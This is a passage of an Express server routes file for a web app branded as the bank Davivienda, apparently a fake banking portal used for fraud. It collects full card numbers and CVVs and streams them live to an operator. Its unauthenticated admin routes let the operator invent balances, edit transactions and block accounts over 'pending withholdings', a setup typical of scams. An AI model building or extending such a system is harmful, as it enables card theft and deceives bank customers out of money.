import express, { type Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import session from "express-session";
import { storage } from "./storage";
import { z } from "zod";
import { 
  insertUserSchema, 
  insertTransactionSchema, 
  insertBeneficiarySchema 
} from "@shared/schema";
import memorystore from 'memorystore';
import { WebSocketServer } from 'ws';
import path from 'path';

// Extend the express-session types
declare module "express-session" {
  interface SessionData {
    userId?: number;
    sessionId?: number;
  }
}

// Extend global namespace for admin notifications
declare global {
  namespace NodeJS {
    interface Global {
      broadcastAdminNotification: (message: string) => void;
    }
  }
}

const MemoryStore = memorystore(session);

export async function registerRoutes(app: Express): Promise<Server> {
  // Initialize default data in database
  await storage.initializeDefaultData();
  
  // Setup session middleware
  app.use(session({
    cookie: { maxAge: 86400000 }, // 24 hours
    store: new MemoryStore({
      checkPeriod: 86400000 // prune expired entries every 24h
    }),
    resave: false,
    saveUninitialized: false,
    secret: process.env.SESSION_SECRET || 'davivienda-secret'
  }));

  // Check auth middleware
  const isAuthenticated = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.userId) {
      next();
    } else {
      res.status(401).json({ message: "No autenticado" });
    }
  };

  // AUTH ROUTES
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: "Documento y clave son requeridos" });
      }

      const user = await storage.getUserByUsername(username);
      
      if (!user || user.password !== password) {
        return res.status(401).json({ message: "Credenciales incorrectas" });
      }

      // Update last login
      await storage.updateUserLastLogin(user.id);
      
      // Create a new user session
      const userSession = await storage.createSession({
        userId: user.id,
        loginTime: new Date(),
        ipAddress: req.ip || "unknown",
        userAgent: req.headers['user-agent'] || "unknown"
      });
      
      // Set user in session
      req.session.userId = user.id;
      req.session.sessionId = userSession.id;
      
      // Enviar notificación de inicio de sesión
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[LOGIN] Usuario "${user.name}" ha iniciado sesión (${timestamp})`);
      
      return res.status(200).json({ 
        message: "Login exitoso",
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          document: user.document,
          phone: user.phone,
          lastLogin: user.lastLogin
        }
      });
    } catch (error) {
      console.error("Error en login:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/auth/register", async (req: Request, res: Response) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      
      // Check if user already exists
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        return res.status(400).json({ message: "El usuario ya existe" });
      }
      
      // Create user
      const user = await storage.createUser(userData);
      
      // Create account for user
      const accountNumber = Math.floor(Math.random() * 10000000000).toString().padStart(10, '0');
      await storage.createAccount({
        userId: user.id,
        accountNumber,
        accountType: "Cuenta de Ahorros",
        balance: 0
      });
      
      // Enviar notificación de registro
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[REGISTRO] Nuevo usuario "${user.name}" se ha registrado (${timestamp})`);
      
      return res.status(201).json({ 
        message: "Usuario registrado con éxito",
        user: {
          id: user.id,
          name: user.name,
          email: user.email
        }
      });
    } catch (error) {
      console.error("Error en registro:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos de usuario inválidos", errors: error.errors });
      }
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/auth/logout", async (req: Request, res: Response) => {
    try {
      // Obtener datos del usuario antes de destruir la sesión
      if (req.session && req.session.userId) {
        const userId = req.session.userId;
        const sessionId = req.session.sessionId as number;
        const user = await storage.getUser(userId);
        
        if (user) {
          // Actualizar registro de la sesión con tiempo de salida
          if (sessionId) {
            await storage.updateSessionLogout(sessionId, new Date());
          }
          
          // Enviar notificación de cierre de sesión
          const timestamp = new Date().toLocaleString();
          (global as any).broadcastAdminNotification(`[LOGOUT] Usuario "${user.name}" ha cerrado sesión (${timestamp})`);
        }
      }
      
      // Destruir sesión
      req.session.destroy(() => {
        res.status(200).json({ message: "Sesión cerrada" });
      });
    } catch (error) {
      console.error("Error en logout:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // USER ROUTES
  app.get("/api/user", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }
      
      return res.status(200).json({
        id: user.id,
        username: user.username,
        name: user.name,
        email: user.email,
        document: user.document,
        phone: user.phone,
        lastLogin: user.lastLogin,
        isAdmin: user.isAdmin || 0
      });
    } catch (error) {
      console.error("Error obteniendo usuario:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // ACCOUNT ROUTES
  app.get("/api/account", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const account = await storage.getAccountByUserId(userId);
      
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      return res.status(200).json(account);
    } catch (error) {
      console.error("Error obteniendo cuenta:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // TRANSACTION ROUTES
  app.get("/api/transactions", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const account = await storage.getAccountByUserId(userId);
      
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      const transactions = await storage.getTransactionsByAccountId(account.id);
      return res.status(200).json(transactions);
    } catch (error) {
      console.error("Error obteniendo transacciones:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/transfer", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, recipientAccountNumber, description } = req.body;
      
      if (!amount || !recipientAccountNumber) {
        return res.status(400).json({ message: "Monto y cuenta destino son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get sender account
      const senderAccount = await storage.getAccountByUserId(userId);
      if (!senderAccount) {
        return res.status(404).json({ message: "Cuenta origen no encontrada" });
      }
      
      // Check if account is blocked
      if (senderAccount.status === "BLOQUEADA") {
        return res.status(403).json({ 
          message: "No puede realizar transferencias. Cuenta bloqueada por retenciones pendientes.",
          error_code: "4004"
        });
      }
      
      // Check balance
      if (senderAccount.balance < amount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      // Get recipient account
      const recipientAccount = await storage.getAccountByNumber(recipientAccountNumber);
      if (!recipientAccount) {
        return res.status(404).json({ message: "Cuenta destino no encontrada" });
      }
      
      // Create outgoing transaction
      const outgoingTransaction = await storage.createTransaction({
        accountId: senderAccount.id,
        amount: -amount,
        description: description || `Transferencia a cuenta ${recipientAccountNumber}`,
        date: new Date(),
        type: "transfer",
        reference: `TRANS-${Date.now()}`,
        recipientId: recipientAccount.id
      });
      
      // Create incoming transaction
      await storage.createTransaction({
        accountId: recipientAccount.id,
        amount: amount,
        description: `Transferencia de cuenta ${senderAccount.accountNumber}`,
        date: new Date(),
        type: "deposit",
        reference: outgoingTransaction.reference,
        recipientId: null
      });
      
      // Update balances
      await storage.updateAccountBalance(senderAccount.id, -amount);
      await storage.updateAccountBalance(recipientAccount.id, amount);
      
      return res.status(200).json({ 
        message: "Transferencia exitosa",
        transaction: outgoingTransaction
      });
    } catch (error) {
      console.error("Error en transferencia:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/payment", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, serviceId, reference } = req.body;
      
      if (!amount || !serviceId || !reference) {
        return res.status(400).json({ message: "Todos los campos son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Check balance
      if (account.balance < amount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      // Check if account is blocked
      if (account.status === "BLOQUEADA") {
        return res.status(403).json({ 
          message: "No puede realizar pagos. Cuenta bloqueada por retenciones pendientes.",
          error_code: "4004"
        });
      }
      
      // Get service
      const service = await storage.getServiceById(serviceId);
      if (!service) {
        return res.status(404).json({ message: "Servicio no encontrado" });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: -amount,
        description: `Pago ${service.name}`,
        date: new Date(),
        type: "payment",
        reference: reference,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, -amount);
      
      return res.status(200).json({ 
        message: "Pago exitoso",
        transaction: transaction
      });
    } catch (error) {
      console.error("Error en pago:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/deposit", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, method } = req.body;
      
      if (!amount || !method) {
        return res.status(400).json({ message: "Monto y método son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: amount,
        description: `Depósito por ${method}`,
        date: new Date(),
        type: "deposit",
        reference: `DEP-${Date.now()}`,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, amount);
      
      return res.status(200).json({ 
        message: "Depósito exitoso",
        transaction: transaction
      });
    } catch (error) {
      console.error("Error en depósito:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/transactions/withdrawal", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const { amount, method } = req.body;
      
      if (!amount || !method) {
        return res.status(400).json({ message: "Monto y método son requeridos" });
      }
      
      if (amount <= 0) {
        return res.status(400).json({ message: "El monto debe ser mayor que cero" });
      }
      
      // Get account
      const account = await storage.getAccountByUserId(userId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Check balance
      if (account.balance < amount) {
        return res.status(400).json({ message: "Fondos insuficientes" });
      }
      
      // Check if account is blocked
      if (account.status === "BLOQUEADA") {
        return res.status(403).json({ 
          message: "No puede realizar retiros. Cuenta bloqueada por retenciones pendientes.",
          error_code: "4004"
        });
      }
      
      // Create transaction
      const transaction = await storage.createTransaction({
        accountId: account.id,
        amount: -amount,
        description: `Retiro por ${method}`,
        date: new Date(),
        type: "withdrawal",
        reference: `WIT-${Date.now()}`,
        recipientId: null
      });
      
      // Update balance
      await storage.updateAccountBalance(account.id, -amount);
      
      return res.status(200).json({ 
        message: "Retiro exitoso",
        transaction: transaction,
        withdrawalCode: Math.floor(100000 + Math.random() * 900000) // 6-digit code
      });
    } catch (error) {
      console.error("Error en retiro:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // BENEFICIARY ROUTES
  app.get("/api/beneficiaries", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const beneficiaries = await storage.getBeneficiariesByUserId(userId);
      return res.status(200).json(beneficiaries);
    } catch (error) {
      console.error("Error obteniendo beneficiarios:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/beneficiaries", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId as number;
      const beneficiaryData = {
        ...req.body,
        userId
      };
      
      const validatedData = insertBeneficiarySchema.parse(beneficiaryData);
      const beneficiary = await storage.createBeneficiary(validatedData);
      
      return res.status(201).json({
        message: "Beneficiario agregado con éxito",
        beneficiary
      });
    } catch (error) {
      console.error("Error agregando beneficiario:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos inválidos", errors: error.errors });
      }
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // ADMIN PANEL ROUTES
  app.get("/admin", (req: Request, res: Response) => {
    const adminPath = path.join(process.cwd(), 'client', 'public', 'admin.html');
    res.sendFile(adminPath);
  });

  app.get("/admin-panel", (req: Request, res: Response) => {
    const adminPanelPath = path.join(process.cwd(), 'client', 'public', 'admin-panel.html');
    res.sendFile(adminPanelPath);
  });

  // API ADMIN ROUTES
  app.get("/api/admin/users", async (req: Request, res: Response) => {
    try {
      const users = await storage.getAllUsers();
      res.status(200).json(users);
    } catch (error) {
      console.error("Error obteniendo usuarios:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/admin/users", async (req: Request, res: Response) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      
      // Check if user already exists
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        return res.status(400).json({ message: "El usuario ya existe" });
      }
      
      // Create user
      const user = await storage.createUser(userData);
      
      // Create account for user
      const accountNumber = Math.floor(Math.random() * 10000000000).toString().padStart(10, '0');
      await storage.createAccount({
        userId: user.id,
        accountNumber,
        accountType: "Cuenta de Ahorros",
        balance: 0
      });
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[REGISTRO] Usuario "${user.name}" ha sido registrado por administrador (${timestamp})`);
      
      res.status(201).json(user);
    } catch (error) {
      console.error("Error creando usuario:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Datos de usuario inválidos", errors: error.errors });
      }
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/users/:id", async (req: Request, res: Response) => {
    try {
      const userId = parseInt(req.params.id);
      const userData = req.body;
      
      // Validate user exists
      const existingUser = await storage.getUser(userId);
      if (!existingUser) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }
      
      // Update user
      const updatedUser = await storage.updateUser(userId, userData);
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ACTUALIZACION] Usuario "${updatedUser.name}" ha sido actualizado por administrador (${timestamp})`);
      
      res.status(200).json(updatedUser);
    } catch (error) {
      console.error("Error actualizando usuario:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/accounts", async (req: Request, res: Response) => {
    try {
      const accounts = await storage.getAllAccounts();
      
      // Get user information for each account
      const accountsWithUserInfo = await Promise.all(accounts.map(async (account) => {
        const user = await storage.getUser(account.userId);
        return {
          ...account,
          userName: user ? user.name : null
        };
      }));
      
      res.status(200).json(accountsWithUserInfo);
    } catch (error) {
      console.error("Error obteniendo cuentas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/accounts/:id/balance", async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const { amount, message, reference: customReference, transactionName } = req.body;
      
      if (!amount || isNaN(amount)) {
        return res.status(400).json({ message: "Monto inválido" });
      }
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Add balance
      const updatedAccount = await storage.updateAccountBalance(accountId, amount);
      
      // Create transaction record
      const transactionType = amount > 0 ? "deposit" : "withdrawal";
      const transactionAmount = Math.abs(amount);
      
      // Si tenemos un nombre de transacción personalizado, lo usamos, sino usamos el mensaje
      // o un texto predeterminado
      const transactionDescription = transactionName || message || (amount > 0 ? "Ajuste de saldo positivo" : "Ajuste de saldo negativo");
      const reference = customReference || `ADJ-${Date.now().toString().slice(-6)}`;
      
      await storage.createTransaction({
        accountId,
        amount: transactionAmount,
        description: transactionDescription,
        date: new Date(),
        type: transactionType,
        reference,
        recipientId: null
      });
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      const adjustmentType = amount > 0 ? "aumentado" : "reducido";
      (global as any).broadcastAdminNotification(`[AJUSTE] Saldo de "${user?.name}" se ha ${adjustmentType} en $${Math.abs(amount).toLocaleString()} (${timestamp})`);
      
      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando saldo:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/accounts/:id/status", async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const { status, statusMessage } = req.body;
      
      if (!status) {
        return res.status(400).json({ message: "Estado requerido" });
      }
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Update status
      const updatedAccount = await storage.updateAccountStatus(accountId, status, statusMessage);
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ESTADO] Cuenta de "${user?.name}" cambió a estado "${status}" (${timestamp})`);
      
      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando estado:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Ruta para actualizar datos generales de una cuenta
  app.put("/api/admin/accounts/:id/update", async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      const accountData = req.body;
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Update account data
      const updatedAccount = await storage.updateAccount(accountId, accountData);
      
      // Notification
      const user = await storage.getUser(account.userId);
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ACTUALIZACIÓN] Datos de cuenta de "${user?.name}" actualizados (${timestamp})`);
      
      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error actualizando cuenta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Ruta para eliminar una cuenta
  app.delete("/api/admin/accounts/:id", async (req: Request, res: Response) => {
    try {
      const accountId = parseInt(req.params.id);
      
      // Validate account exists
      const account = await storage.getAccountById(accountId);
      if (!account) {
        return res.status(404).json({ message: "Cuenta no encontrada" });
      }
      
      // Get user info for notification before deletion
      const user = await storage.getUser(account.userId);
      
      // Delete account (this will also delete all related transactions)
      const deleted = await storage.deleteAccount(accountId);
      
      if (!deleted) {
        return res.status(500).json({ message: "Error al eliminar la cuenta" });
      }
      
      // Notification
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(`[ELIMINACIÓN] Cuenta de "${user?.name}" (${account.accountNumber}) ha sido eliminada (${timestamp})`);
      
      res.status(200).json({ message: "Cuenta eliminada exitosamente" });
    } catch (error) {
      console.error("Error eliminando cuenta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/transactions", async (req: Request, res: Response) => {
    try {
      const transactions = await storage.getAllTransactions();
      
      // Enrich transactions with account information
      const enrichedTransactions = await Promise.all(transactions.map(async (transaction) => {
        const account = await storage.getAccountById(transaction.accountId);
        return {
          ...transaction,
          accountNumber: account ? account.accountNumber : null,
          userName: account ? (await storage.getUser(account.userId))?.name : null
        };
      }));
      
      res.status(200).json(enrichedTransactions);
    } catch (error) {
      console.error("Error obteniendo transacciones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // Ruta para actualizar una transacción
  app.put("/api/admin/transactions/:id", async (req: Request, res: Response) => {
    try {
      const transactionId = parseInt(req.params.id);
      const transactionData = req.body;
      
      // Actualizar la transacción
      const updatedTransaction = await storage.updateTransaction(transactionId, transactionData);
      
      if (!updatedTransaction) {
        return res.status(404).json({ message: "Transacción no encontrada" });
      }
      
      // Notificación
      const account = await storage.getAccountById(updatedTransaction.accountId);
      const user = account ? await storage.getUser(account.userId) : null;
      const timestamp = new Date().toLocaleString();
      (global as any).broadcastAdminNotification(
        `[TRANSACCIÓN] Transacción de ${user?.name || 'usuario desconocido'} actualizada (${timestamp})`
      );
      
      res.status(200).json(updatedTransaction);
    } catch (error) {
      console.error("Error actualizando transacción:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/sessions", async (req: Request, res: Response) => {
    try {
      const sessions = await storage.getAllSessions();
      
      // Enrich sessions with user information
      const enrichedSessions = await Promise.all(sessions.map(async (session) => {
        const user = await storage.getUser(session.userId);
        return {
          ...session,
          userName: user ? user.name : null
        };
      }));
      
      res.status(200).json(enrichedSessions);
    } catch (error) {
      console.error("Error obteniendo sesiones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/admin/statistics", async (req: Request, res: Response) => {
    try {
      // Get counts
      const users = await storage.getAllUsers();
      const accounts = await storage.getAllAccounts();
      const sessions = await storage.getAllSessions();
      
      // Calculate statistics
      const totalUsers = users.length;
      
      const activeAccounts = accounts.filter(a => a.status !== 'BLOQUEADA').length;
      const blockedAccounts = accounts.filter(a => a.status === 'BLOQUEADA').length;
      
      // Filtra las sesiones que realmente están activas (sin tiempo de cierre) 
      // y que no sean demasiado antiguas (más de 24 horas)
      const oneDayAgo = new Date();
      oneDayAgo.setDate(oneDayAgo.getDate() - 1);
      
      const activeSessions = sessions.filter(s => {
        // Si tiene tiempo de cierre, no está activa
        if (s.logoutTime !== null) return false;
        
        // Si la sesión es más antigua de 24 horas, considerarla cerrada
        const loginTime = new Date(s.loginTime);
        return loginTime > oneDayAgo;
      }).length;
      
      // Get recent users (last 5)
      const recentUsers = [...users]
        .sort((a, b) => new Date(b.lastLogin).getTime() - new Date(a.lastLogin).getTime())
        .slice(0, 5);
      
      res.status(200).json({
        totalUsers,
        activeAccounts,
        blockedAccounts,
        activeSessions,
        recentUsers
      });
    } catch (error) {
      console.error("Error obteniendo estadísticas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // CARD ROUTES (Admin)
  app.get("/api/admin/cards", async (req: Request, res: Response) => {
    try {
      const cards = await storage.getAllCards();
      
      // Enrich cards with user information
      const enrichedCards = await Promise.all(cards.map(async (card) => {
        const user = await storage.getUser(card.userId);
        return {
          ...card,
          userName: user ? user.name : null,
          userDocument: user ? user.document : null
        };
      }));
      
      res.status(200).json(enrichedCards);
    } catch (error) {
      console.error("Error obteniendo tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/admin/cards/pending", async (req: Request, res: Response) => {
    try {
      const cards = await storage.getPendingCards();
      
      // Enrich cards with user information
      const enrichedCards = await Promise.all(cards.map(async (card) => {
        const user = await storage.getUser(card.userId);
        return {
          ...card,
          userName: user ? user.name : null,
          userDocument: user ? user.document : null
        };
      }));
      
      res.status(200).json(enrichedCards);
    } catch (error) {
      console.error("Error obteniendo tarjetas pendientes:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/approve", async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const adminId = req.session.userId || 1;
      
      const card = await storage.approveCard(cardId, adminId);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: "card_approved",
        message: `Su tarjeta ha sido aprobada y está activa.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error aprobando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/reject", async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      
      const card = await storage.rejectCard(cardId);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: "card_rejected",
        message: `Su solicitud de tarjeta ha sido rechazada.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error rechazando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/status", async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { status } = req.body;
      
      if (!status) {
        return res.status(400).json({ message: "Estado es requerido" });
      }
      
      const card = await storage.updateCardStatus(cardId, status);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      const statusMessages: { [key: string]: string } = {
        'active': 'Su tarjeta ha sido activada.',
        'blocked': 'Su tarjeta ha sido bloqueada.',
        'frozen': 'Su tarjeta ha sido congelada.',
        'pending': 'Su tarjeta está pendiente de revisión.'
      };
      
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: `card_${status}`,
        message: statusMessages[status] || `Estado de tarjeta actualizado a ${status}.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando estado de tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/balance", async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { balance } = req.body;
      
      if (balance === undefined) {
        return res.status(400).json({ message: "Saldo es requerido" });
      }
      
      const card = await storage.updateCardBalance(cardId, Number(balance));
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando saldo de tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/balance-status", async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { balanceStatus } = req.body;
      
      if (!balanceStatus) {
        return res.status(400).json({ message: "Estado de saldo es requerido" });
      }
      
      const card = await storage.updateCardBalanceStatus(cardId, balanceStatus);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      const statusMessages: { [key: string]: string } = {
        'active': 'El saldo de su tarjeta está activo.',
        'blocked': 'El saldo de su tarjeta ha sido bloqueado.',
        'frozen': 'El saldo de su tarjeta ha sido congelado.'
      };
      
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: `balance_${balanceStatus}`,
        message: statusMessages[balanceStatus] || `Estado de saldo actualizado.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando estado de saldo:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/admin/card-notifications", async (req: Request, res: Response) => {
    try {
      const notifications = await storage.getAllCardNotifications();
      res.status(200).json(notifications);
    } catch (error) {
      console.error("Error obteniendo notificaciones de tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // CARD ROUTES (User)
  app.get("/api/cards", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const cards = await storage.getCardsByUserId(userId);
      res.status(200).json(cards);
    } catch (error) {
      console.error("Error obteniendo tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.post("/api/cards/request", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const user = await storage.getUser(userId);
      
      // Create a pending card request
      const card = await storage.createCard({
        userId,
        cardNumber: "****-****-****-" + Math.floor(1000 + Math.random() * 9000),
        cardType: req.body.cardType || "debit",
        cardBrand: req.body.cardBrand || "visa",
        expirationDate: "00/00",
        status: "pending",
        balance: 0,
        balanceStatus: "active",
        requestType: "request"
      });
      
      // Create admin notification
      await storage.createCardNotification({
        userId: 1, // Admin
        cardId: card.id,
        type: "card_request",
        message: `Usuario ${user?.name || userId} ha solicitado una nueva tarjeta.`,
        read: 0
      });
      
      // Broadcast to admin
      (global as any).broadcastAdminNotification(`[TARJETA] Nueva solicitud de tarjeta de ${user?.name || 'Usuario'}`);
      
      res.status(201).json(card);
    } catch (error) {
      console.error("Error solicitando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.post("/api/cards/register", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const user = await storage.getUser(userId);
      const { cardNumber, cardType, cardBrand, expirationDate, cvv } = req.body;
      
      if (!cardNumber || !expirationDate) {
        return res.status(400).json({ message: "Datos de tarjeta incompletos" });
      }
      
      // Create a pending card registration
      const card = await storage.createCard({
        userId,
        cardNumber,
        cardType: cardType || "debit",
        cardBrand: cardBrand || "visa",
        expirationDate,
        cvv,
        status: "pending",
        balance: 0,
        balanceStatus: "active",
        requestType: "register"
      });
      
      // Create admin notification
      await storage.createCardNotification({
        userId: 1, // Admin
        cardId: card.id,
        type: "card_register",
        message: `Usuario ${user?.name || userId} está intentando inscribir una tarjeta: ${cardNumber}`,
        read: 0
      });
      
      // Broadcast to admin
      (global as any).broadcastAdminNotification(`[TARJETA] Usuario ${user?.name || 'Usuario'} inscribiendo tarjeta: ${cardNumber}`);
      
      res.status(201).json(card);
    } catch (error) {
      console.error("Error inscribiendo tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/card-notifications", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const notifications = await storage.getCardNotificationsByUserId(userId);
      res.status(200).json(notifications);
    } catch (error) {
      console.error("Error obteniendo notificaciones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // SERVICE ROUTES
  app.get("/api/services", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const { category } = req.query;
      
      let services;
      if (category) {
        services = await storage.getServicesByCategory(category as string);
      } else {
        services = await storage.getAllServices();
      }
      
      return res.status(200).json(services);
    } catch (error) {
      console.error("Error obteniendo servicios:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Create HTTP server
  const httpServer = createServer(app);
  
  // Setup WebSocket server for real-time notifications
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Store active connections
  const connections: any[] = [];
  
  // WebSocket events
  wss.on('connection', (ws: any) => {
    console.log('WebSocket client connected');
    connections.push(ws);
    
    ws.on('close', () => {
